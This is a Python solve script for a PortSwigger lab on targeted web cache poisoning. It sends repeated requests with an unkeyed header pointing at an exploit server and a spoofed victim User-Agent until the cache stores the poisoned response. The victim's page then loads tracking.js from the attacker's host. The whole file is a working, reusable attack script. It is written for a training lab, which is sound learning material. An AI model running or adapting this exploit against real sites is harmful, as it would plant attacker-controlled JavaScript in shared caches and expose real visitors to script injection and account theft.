#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Targeted web cache poisoning using an unknown header.

Requires the victim's User-Agent (from exploit server logs) and the
discovered unkeyed header name. Poisons the cache entry for that UA.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 4 (unknown header, targeted UA)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Exploit server hostname (no https://)")
    parser.add_argument("victim_ua", help="Victim's User-Agent (from exploit server logs)")
    parser.add_argument("--header", default="X-Host", help="Unkeyed header name (default: X-Host)")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    headers = {
        args.header: args.exploit_host,
        "User-Agent": args.victim_ua,
    }

    print(f"[*] Poisoning with {args.header}={args.exploit_host}")
    print(f"[*] Using victim User-Agent: {args.victim_ua[:80]}...")
    for i in range(1, args.max_attempts + 1):
        r = s.get(f"{lab}/", headers=headers)
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if cache_status == "hit":
            print(f"[+] Cache poisoned for victim UA! Ensure {args.exploit_host}/resources/js/tracking.js serves your payload.")
            return

    print("[-] Cache hit not observed — try more attempts or check header name.")


if __name__ == "__main__":
    main()
